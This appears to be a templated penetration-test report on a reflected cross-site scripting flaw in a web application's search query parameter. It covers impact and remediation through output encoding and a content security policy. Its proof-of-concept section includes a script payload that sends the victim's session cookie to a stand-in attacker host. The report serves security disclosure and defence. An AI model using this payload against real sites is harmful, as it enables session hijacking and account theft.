# Penetration Testing Writeup: Cross-Site Scripting (XSS) Vulnerability

## Executive Summary

During a recent penetration test conducted on [Target Application], a critical
Cross-Site Scripting (XSS) vulnerability was identified in the application's
user input handling mechanism. This vulnerability allows an attacker to inject
malicious scripts into web pages viewed by other users, potentially leading to
session hijacking, data theft, or defacement of the website. This report details
the vulnerability, its impact, proof of concept, and recommended remediation
steps.

## Vulnerability Details

- **Vulnerability Type**: Cross-Site Scripting (XSS) - Reflected
- **Severity**: High
- **Affected Component**: Search functionality on the main page
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Location**: `https://[target-application]/search?query=[input]`
- **Discovered By**: [PenTester Name]
- **Date Discovered**: August 15, 2025

### Description

The search functionality on the main page of [Target Application] does not
properly sanitize user inputs in the query parameter. When a user submits a
search query, the application reflects the input directly into the HTML response
without encoding or validation. This allows an attacker to craft a malicious URL
containing JavaScript code that executes in the context of the victim's browser.

### Impact

- **Session Hijacking**: An attacker can steal session cookies, allowing
  unauthorized access to user accounts.
- **Phishing Attacks**: Malicious scripts can display fake login forms to
  capture user credentials.
- **Data Theft**: Sensitive information displayed on the page can be exfiltrated
  to an attacker-controlled server.
- **Website Defacement**: The attacker can manipulate the page's content,
  damaging the application's reputation.

### Proof of Concept

1. Navigate to the search page:
   `https://[target-application]/search?query=<script>alert('XSS Vulnerability');</script>`
2. Observe that an alert box with the message "XSS Vulnerability" appears in the
   browser.
3. A more malicious payload could be used, such as:
   ```
   https://[target-application]/search?query=<script>fetch('https://attacker.com/steal?cookie='+document.cookie);</script>
   ```
   This payload sends the user's session cookie to an attacker-controlled
   server.

### Steps to Reproduce

1. Open a web browser and navigate to `https://[target-application]/search`.
2. In the search bar, enter the following payload:
   `<script>alert('XSS Vulnerability');</script>`.
3. Submit the search query.
4. Verify that the JavaScript alert is triggered, confirming the vulnerability.

## Remediation Recommendations

To mitigate this vulnerability, the following actions are recommended:

1. **Input Validation and Sanitization**:
   - Implement strict input validation to ensure only expected characters are
     allowed in the search query (e.g., alphanumeric characters and specific
     symbols).
   - Use a server-side library like OWASP's AntiSamy or a similar HTML
     sanitization tool to filter out malicious code.
2. **Output Encoding**:
   - Encode all user inputs when rendering them in the HTML response using
     context-appropriate encoding (e.g., HTML entity encoding for HTML content,
     JavaScript encoding for script contexts).
   - Example: Convert `<` to `&lt;` and `>` to `&gt;` before rendering.
3. **Content Security Policy (CSP)**:
   - Implement a strict CSP header to prevent the execution of inline scripts
     and restrict script sources to trusted domains.
   - Example CSP header:
     `Content-Security-Policy: script-src 'self'; object-src 'none';`
4. **Secure Development Training**:
   - Train developers on secure coding practices, emphasizing the risks of XSS
     and the importance of input validation and output encoding.
5. **Regular Security Testing**:
   - Conduct periodic penetration testing and code reviews to identify and
     address similar vulnerabilities.

## Conclusion

The identified XSS vulnerability poses a significant risk to the security and
integrity of [Target Application]. Immediate action is required to implement the
recommended remediation steps. By addressing this issue, the application can
protect its users from potential attacks and maintain trust in its security
posture.
